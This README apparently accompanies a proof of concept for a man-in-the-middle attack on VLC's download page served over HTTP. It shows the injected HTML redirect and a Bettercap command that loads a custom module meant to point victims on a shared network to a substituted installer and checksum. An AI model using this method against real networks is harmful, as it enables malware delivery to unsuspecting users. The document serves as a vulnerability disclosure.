# PoC Video
https://www.youtube.com/watch?v=dhTAqCz7ktU

# Man in The Middle
VLC's official website, even having a valid SSL certificate, does not force users to use the HTTPS protocol. Major search engines have indexed VLC's website as HTTP so users are being redirected to the insecure version of the site.

According to the official stats, published by VLC founder, the software has been downloaded over 2.3 billion times: https://twitter.com/etixxx/status/881926077836398592

Through a "Man in The Middle" attack, it is possible to inject arbitrary HTML code on VLC's official website served over HTTP, deceiving the users to download an authentic installer file but actually redirecting them to a potentially malicious external resource which could deliver a malware-laced package. The attack is doable if both, the user and the attacker, are on the same network (i.e. public access point of an airport, hotel, etc.)

The result of the attack is the alteration of the download page (i.e. http://get.videolan.org/vlc/2.2.6/win32/vlc-2.2.6-win32.exe) where we modify the following parts of code:

```html
<meta http-equiv="refresh" content="5;URL='https://videolan.mirror.garr.it/mirrors/videolan/vlc/2.2.6/win32/vlc-2.2.6-win32.exe'" />

<span> If not, <a href="https://videolan.mirror.garr.it/mirrors/videolan/vlc/2.2.6/win32/vlc-2.2.6-win32.exe" id="alt_link">click here</a>.
```

# How To
In order to effectively carry out the attack, we used Bettercap (https://www.bettercap.org/) and a custom Ruby module "exploit_vlc.rb" which is made publicly available on this repo.

The custom Ruby module contains the URL of the mirror, which we want the victim to point to, for downloading the VLC installer, it is also possible to replace the checksum with one that’s valid for our malware.

Once the module has been customised, Bettercap can be started using root privileges as shown below:

$ sudo bettercap --proxy-module exploit_vlc.rb

Eventually, it would be possible to use a specific target calling the -T option and the network interface with the -I one. If no target is specified, all connected hosts of the network could become a potential target.

# Credits
* Fabio (Naif) Pietrosanti 
* Andrea (Drego) Draghetti
* Eddy (mane) Boscolo

# Disclaimer 
All of provided information in this article is for educational purposes only. You accept full responsibility for the consequences of your use, or non-use, of any information provided by us through any means whatsoever.
